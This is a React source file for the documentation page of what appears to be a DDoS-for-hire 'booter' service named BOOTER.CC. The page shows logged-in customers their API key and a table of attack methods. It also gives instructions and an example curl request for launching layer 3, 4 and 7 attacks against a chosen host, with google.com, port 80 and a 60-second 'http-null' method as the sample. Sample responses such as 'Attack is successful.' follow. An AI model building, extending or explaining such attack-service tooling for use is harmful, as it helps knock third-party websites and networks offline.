import { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet';
import { 
  Box,
  Card, 
  CardHeader,
  CardContent,
  Divider,
  Container, 
  Grid, 
  Link, 
  Typography,
  TablePagination
  } from '@material-ui/core';
import Config from '../config.json';
import LoadingScreen from 'react-loading-screen';
import authenticate from '../handler/authenticate';
import Axios from '../handler/axios';
import { MethodsTable } from '../components/methods-table';
import { ApiTable } from '../components/api-table';
import { getTime } from 'date-fns';

export const Documentation = () => {
  const [loading, setLoading] = useState(true)
  const [rowsPerPage, setRowsPerPage] = useState(5);
  const [page, setPage] = useState(0);
  const [methods, setMethods] = useState([])
  const [apiKey, setApiKey] = useState('')

  useEffect( () => {
    async function fetchData() {
      const authRequest = await authenticate()
      if(!authRequest)
        window.location.href = '/login'
      else {
        const token = getTime(new Date())
        const request = await Axios.get(`/getDocs/${token}`)
        if(request.data.success) {
          setMethods(request.data.message.methodsFound)
          setApiKey(request.data.message.apikey)
        }
        setLoading(false)
      }
    }
    fetchData();
  }, [])

  const handleChangePage = (event, newPage) => {
    setPage(newPage);
  };

  const handleChangeRowsPerPage = (event) => {
    setRowsPerPage(parseInt(event.target.value, 10));
    setPage(0);
  };
  return (
    <>
      <Helmet>
        <title>Documentation | BOOTER.CC</title>
      </Helmet>
      <LoadingScreen
        loading={loading}
        bgColor='#111318'
        spinnerColor='#ECEDED'
      > 
      <Box
        sx={{
          backgroundColor: 'background.default',
          pb: 3,
          pt: 8
        }}
      >
        <Container maxWidth="lg">
          <Grid
            container
            spacing={3}
          >
            <Grid
              item
              xs={12}
            >
              <Card
                variant="outlined"
              >
                <CardHeader title="Documentation" />
                <Divider />
                <CardContent>
                  <Box
                    sx={{
                      pb: 3,
                      pt: 3
                    }}
                  > 
                    <Container maxWidth="100%">
                      <Grid
                        container
                        spacing={3}
                      >
                        <Grid
                          item
                          sm={6}
                          xs={12}
                        >
                          <Typography
                            color="textPrimary"
                            variant="h5"
                            sx={{
                              mb: 1
                            }}
                          >
                            Launch an attack
                          </Typography>
                          <Typography
                            color="textSecondary"
                            variant="body1"
                            sx={{
                              mb: 2
                            }}
                          >
                            To launch a layer 7, layer 4 and layer 3 attack, you need to 
                            send a GET request to the following URL with the following arguments. 
                            Please note that our API does not support advanced layer 7 methods that allows you to 
                            customize headers, post & get data and other stuff. 
                          </Typography>
                          <Box
                            sx={{
                              backgroundColor: 'background.default',
                              pb: 3,
                              pt: 3,
                              mb: 2
                            }}
                          >
                            <Typography
                              color="textPrimary"
                              variant="subtitle2"
                              sx={{
                                ml: 2
                              }}
                            >
                              API KEY: {apiKey}
                            </Typography>
                          </Box>
                          <Container maxWidth="lg">
                            <ApiTable />
                          </Container>
                        </Grid>
                        <Grid
                          item
                          sm={6}
                          xs={12}
                        >
                          <Typography
                            color="textPrimary"
                            variant="h5"
                          >
                            GET {Config.api_url}
                          </Typography>
                          <Typography
                            color="textPrimary"
                            variant="h6"
                            sx={{
                              mt: 3,
                              mb: 1
                            }}
                          >
                            Example request
                          </Typography>
                          <Card
                            variant="outlined"
                          >
                            <Box
                              sx={{
                                backgroundColor: 'background.default',
                                pb: 3,
                                pt: 3
                              }}
                            >
                              <Typography
                                color="textPrimary"
                                variant="subtitle2"
                                sx={{
                                  ml: 3
                                }}
                              >
                                curl https://{Config.api_url}
                                <br />
                                    -X "GET"
                                <br />
                                    -H 'Content-type: application/json' 
                                <br />
                                    -d "host=google.com"
                                <br />
                                    -d "port=80"
                                <br />
                                    -d "time=60"
                                <br />
                                    -d "method=http-null"
                                <br />
                                    -d "proxy=0"
                                <br />
                                    -d "key={apiKey}"
                              </Typography>
                            </Box>
                          </Card>
                          <Typography
                            color="textPrimary"
                            variant="h6"
                            sx={{
                              mt: 3,
                              mb: 1
                            }}
                          >
                            Example response
                          </Typography>
                          <Card
                            variant="outlined"
                            sx={{
                              mb: 1
                            }}
                          >
                            <Box
                              sx={{
                                backgroundColor: 'background.default',
                                pb: 3,
                                pt: 3
                              }}
                            >
                              <Typography
                                color="textPrimary"
                                variant="subtitle2"
                                sx={{
                                  ml: 3
                                }}
                              >
                                {`{`}
                                <br />
                                    success: true,
                                <br />
                                    message: "Attack is successful."
                                <br />
                                {`}`}
                              </Typography>
                            </Box>
                          </Card>
                          <Card
                            variant="outlined"
                          >
                            <Box
                              sx={{
                                backgroundColor: 'background.default',
                                pb: 3,
                                pt: 3
                              }}
                            >
                              <Typography
                                color="textPrimary"
                                variant="subtitle2"
                                sx={{
                                  ml: 3
                                }}
                              >
                                {`{`}
                                <br />
                                    success: false,
                                <br />
                                    message: "Concurrent limit exceeded."
                                <br />
                                {`}`}
                              </Typography>
                            </Box>
                          </Card>
                        </Grid>
                        <Grid
                          item
                          xs={12}
                        >
                          <Typography
                            color="textPrimary"
                            variant="h5"
                          >
                            Methods details & API values
                          </Typography>
                        </Grid>
                        <Grid
                          item
                          xs={12}
                        >
                          <Box
                            sx={{
                              backgroundColor: 'background.default',
                              pb: 3,
                              pt: 3
                            }}
                          >
                            <Container maxWidth="lg">
                              <MethodsTable methods={methods.slice(page * rowsPerPage, page * rowsPerPage + rowsPerPage)} />
                              <Divider />
                              <TablePagination
                                rowsPerPageOptions={[5, 10, 25]}
                                component="div"
                                count={methods.length}
                                rowsPerPage={rowsPerPage}
                                page={page}
                                onPageChange={handleChangePage}
                                onRowsPerPageChange={handleChangeRowsPerPage}
                              />
                            </Container>
                          </Box>
                        </Grid>
                      </Grid>
                    </Container>
                  </Box>
                </CardContent>
              </Card>
            </Grid>
          </Grid>
        </Container>
      </Box>
      </LoadingScreen>
    </>
  )
};
